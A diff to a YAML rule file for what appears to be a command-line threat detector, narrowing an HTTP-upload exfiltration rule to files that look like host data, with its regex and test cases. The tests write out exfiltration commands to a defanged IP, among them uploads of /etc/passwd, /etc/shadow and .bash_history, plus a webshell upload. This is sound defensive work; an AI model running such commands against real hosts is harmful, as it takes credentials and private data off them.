@@ -346,13 +346,16 @@
       - "sudo -u bob id"
       - "sudo -i"
 
-# A local file sent to a web server: curl -T, --upload-file, a form field or data read from a file (=@ or @), wget
+# Host data sent to a web server: curl -T, --upload-file, a form field or data read from a file (=@ or @), wget
 # --post-file, Invoke-WebRequest or Invoke-RestMethod with -InFile or a -Body read from a file, and WebClient's
-# Upload methods. Case-sensitive curl options: -t is a telnet option and -f is --fail.
+# UploadFile. Case-sensitive curl options: -t is a telnet option and -f is --fail.
+# The direction of an upload is not in the command: an attacker also uploads its own tools or test files to a
+# target's upload form (seen in the OpenRAE Duels re-run). So the file must look like host data: one under a system,
+# home or user folder, or an archive, database, document, dump, backup or key. Anything else is left to the model.
 - id: http-upload
   match:
-    regex: '(?i){stage}(?:curl(?:\.exe)?{end}(?={seg}*?[^\S\n](?:(?-i:-T)|--upload-file|(?-i:-F)[^\S\n]*["\x27]?[\w.-]+=@|--form[^\S\n]+["\x27]?[\w.-]+=@|--data-binary[^\S\n]+["\x27]?@|(?-i:-d)[^\S\n]*["\x27]?@|--data(?:-raw|-urlencode)?[^\S\n]+["\x27]?@))|wget{end}(?={seg}*?[^\S\n]--post-file(?:=|[^\S\n]))|(?:invoke-webrequest|iwr|invoke-restmethod|irm){end}(?={seg}*?[^\S\n]-infile{end}))|(?<![\w-])-body[^\S\n]+\(?[^\S\n]*(?:get-content|gc|\[(?:system\.)?io\.file\]::readall(?:bytes|text))(?![\w-])|\.upload(?:file|data|string|values)(?:async)?\('
-  meaning: Uploads a local file or its contents to a remote web server, often to take data off the host.
+    regex: '(?i){stage}(?:curl(?:\.exe)?{end}(?={seg}*?[^\S\n](?:(?-i:-T)[^\S\n]+|--upload-file[^\S\n]+|(?-i:-F)[^\S\n]*["\x27]?[\w.-]+=@|--form[^\S\n]+["\x27]?[\w.-]+=@|--data-binary[^\S\n]+["\x27]?@|(?-i:-d)[^\S\n]*["\x27]?@|--data(?:-raw|-urlencode)?[^\S\n]+["\x27]?@)["\x27]?(?:(?:/etc|/root|/home|/var|/opt|/srv|~|\$home|[a-z]:\\(?:users|programdata|windows))[/\\][^\s"\x27|;&()]*|[^\s"\x27|;&()]*\.(?:zip|tgz|tar|gz|bz2|xz|7z|rar|db|sqlite3?|sql|kdbx|pst|ost|dmp|bak|csv|xlsx?|docx?|pdf|pem|key|ppk|pfx))(?![\w.-]))|wget{end}(?={seg}*?[^\S\n]--post-file(?:=|[^\S\n]+)["\x27]?(?:(?:/etc|/root|/home|/var|/opt|/srv|~|\$home)[/\\][^\s"\x27|;&()]*|[^\s"\x27|;&()]*\.(?:zip|tgz|tar|gz|bz2|xz|7z|rar|db|sqlite3?|sql|kdbx|pst|ost|dmp|bak|csv|xlsx?|docx?|pdf|pem|key|ppk|pfx))(?![\w.-]))|(?:invoke-webrequest|iwr|invoke-restmethod|irm){end}(?={seg}*?[^\S\n]-infile[^\S\n]+["\x27]?(?:(?:~|\$home|\$env:userprofile|[a-z]:\\(?:users|programdata|windows))[/\\][^\s"\x27|;&()]*|[^\s"\x27|;&()]*\.(?:zip|tgz|tar|gz|bz2|xz|7z|rar|db|sqlite3?|sql|kdbx|pst|ost|dmp|bak|csv|xlsx?|docx?|pdf|pem|key|ppk|pfx))(?![\w.-])))|(?<![\w-])-body[^\S\n]+\(?[^\S\n]*(?:get-content|gc)[^\S\n]+(?:-path[^\S\n]+)?["\x27]?(?:(?:~|\$home|\$env:userprofile|[a-z]:\\(?:users|programdata|windows))[/\\][^\s"\x27|;&()]*|[^\s"\x27|;&()]*\.(?:zip|tgz|tar|gz|bz2|xz|7z|rar|db|sqlite3?|sql|kdbx|pst|ost|dmp|bak|csv|xlsx?|docx?|pdf|pem|key|ppk|pfx))(?![\w.-])|\.uploadfile(?:async)?\([^,)\n]*,[^\S\n]*["\x27]?(?:(?:~|\$home|\$env:userprofile|[a-z]:\\(?:users|programdata|windows))[/\\][^\s"\x27|;&()]*|[^\s"\x27|;&()]*\.(?:zip|tgz|tar|gz|bz2|xz|7z|rar|db|sqlite3?|sql|kdbx|pst|ost|dmp|bak|csv|xlsx?|docx?|pdf|pem|key|ppk|pfx))(?![\w.-])'
+  meaning: Uploads a file that looks like host data (an archive, a database, a document, a key, or a file from a system or home folder) to a remote web server, a common way to take data off the host.
   techniques: [T1048]
   artifacts: [File, Network Connection]
   iocs: [url, ipv4, domain, path]
@@ -361,12 +364,14 @@
     match:
       - "curl -T /etc/passwd hxxp://203.0.113[.]5:8000/"
       - "curl -F 'file=@/tmp/d.tgz' hxxp://203.0.113[.]5/up"
-      - "curl --data-binary @/tmp/d.tgz hxxp://203.0.113[.]5/"
+      - "curl --data-binary @/home/bob/.bash_history hxxp://203.0.113[.]5/"
       - "wget --post-file=/etc/shadow hxxp://203.0.113[.]5/"
       - 'Invoke-WebRequest -Uri hxxp://203.0.113[.]5/u -Method POST -InFile C:\temp\d.zip'
-      - 'Invoke-RestMethod -Uri hxxp://203.0.113[.]5/u -Method Post -Body (Get-Content C:\temp\d.txt)'
+      - 'Invoke-RestMethod -Uri hxxp://203.0.113[.]5/u -Method Post -Body (Get-Content C:\Users\bob\notes.txt)'
       - "(New-Object Net.WebClient).UploadFile('hxxp://203.0.113[.]5/u', 'd.zip')"
     no_match:
       - "curl -s hxxp://203.0.113[.]5/x -o x"
       - "curl -d 'user=a' hxxp://203.0.113[.]5/login"
       - "Invoke-WebRequest -Uri hxxp://203.0.113[.]5/x -OutFile x"
+      - 'curl -sk -X POST hxxp://172.20.1[.]20:8080/upload -F "file=@/tmp/dbquery.py"'
+      - "curl -T shell.php hxxp://10.0.0[.]5/webdav/"
